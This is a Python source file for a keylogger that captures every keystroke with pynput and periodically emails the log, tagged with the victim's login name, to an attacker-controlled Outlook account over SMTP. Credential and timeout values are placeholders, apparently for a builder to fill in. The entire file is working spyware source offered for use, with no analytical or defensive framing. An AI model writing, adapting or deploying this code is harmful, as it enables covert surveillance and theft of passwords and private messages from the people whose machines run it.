#This keylogger captures keystrokes with 'pynput' and emails them periodically with 'smtplib'.

import os
import smtplib
import tempfile
import threading 
from pynput import keyboard as kb
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class KeyLogger():
    def __init__(self, email : str, password : str, timeout : int) -> None:
        self.email    : str = email
        self.password : str = password
        self.timeout  : int = timeout
        self.log      : str = ""
        
    def callback(self, key : str) -> None:
        try:
            self.log = self.log + str(key.char)

        except AttributeError:
            if key == key.space:
                self.log += " "
                
            else: 
                self.log = self.log + f" [{str(key).replace('KEY.', '')}]"

        except Exception as e:
            temp_file = self.create_temp_file_and_write(message=str(e))
            self.send_mail(temp_file) 
                    
    def send_mail(self, file_name : str) -> None:
        host = os.getlogin()
        try:
            email_server : smtplib.SMTP = smtplib.SMTP("smtp-mail.outlook.com", 587)
            email_server.starttls()
            email_server.login(self.email, self.password)
            
            message : MIMEMultipart = MIMEMultipart()
            message["From"] = "Shypy"
            message["To"] = self.email
            message["Subject"] = f"Keylogger Log from {host}"
            
            with open(file_name, "r") as attachment:
                part : MIMEText = MIMEText(attachment.read())
            
            part.add_header(
                "Content-Disposition",
                f"attachment; filename= {os.path.basename(file_name)}",
            )
            
            message.attach(part)
            text = message.as_string()
            email_server.sendmail(self.email, self.email, text)
            email_server.quit()
            
            self.log = ""
            
            os.remove(file_name)
            
        except Exception as e:
            temp_file = self.create_temp_file_and_write(message=str(e))
            self.send_mail(temp_file)
                        
    def create_temp_file_and_write(self, message : str) -> str:
        with tempfile.NamedTemporaryFile(delete=False, suffix='.txt') as temp_file:
            temp_file.write(message.encode("utf-8"))
                
        return temp_file.name
    
    def thread_function(self) -> None:
        try:
            temp_file = self.create_temp_file_and_write(message=self.log)
            self.send_mail(temp_file)
            
            timer_object = threading.Timer(self.timeout, self.thread_function)
            timer_object.start()
            
        except RecursionError as e:
            wait_time = 60
            timer = threading.Timer(wait_time, self.thread_function)
            timer.start()
            
        except Exception as e:
            temp_file = self.create_temp_file_and_write(message=str(e))
            self.send_mail(temp_file)
        
    def run(self) -> None:
        keyboard_listener : kb.Listene = kb.Listener(on_press=self.callback)

        with keyboard_listener:
            self.thread_function()
            keyboard_listener.join()

if __name__ == "__main__":
    KeyLogger(email="userMail_", password="userPassword_", timeout=int("timeOut_")).run()